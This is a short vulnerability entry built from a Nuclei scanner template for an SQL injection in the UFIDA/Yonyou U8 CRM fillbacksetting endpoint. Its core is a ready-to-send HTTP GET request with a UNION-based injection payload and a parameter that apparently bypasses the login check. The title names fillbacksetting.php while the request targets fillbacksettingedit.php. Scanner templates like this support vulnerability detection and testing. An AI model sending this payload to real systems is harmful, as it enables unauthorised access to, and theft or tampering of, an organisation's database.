# Nuclei Template: UFIDA U8 CRM cfillbacksetting.php - SQL Injection
**Template ID:** yonyou-u8-crm-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-crm-sqli.yaml`)

## Vulnerability Information & PoC

## Description
UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.

## Steps to reproduce / Exploit Payload
```http
GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=bgsesstimeout-;
```

## References
- https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9Ffillbacksetting.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
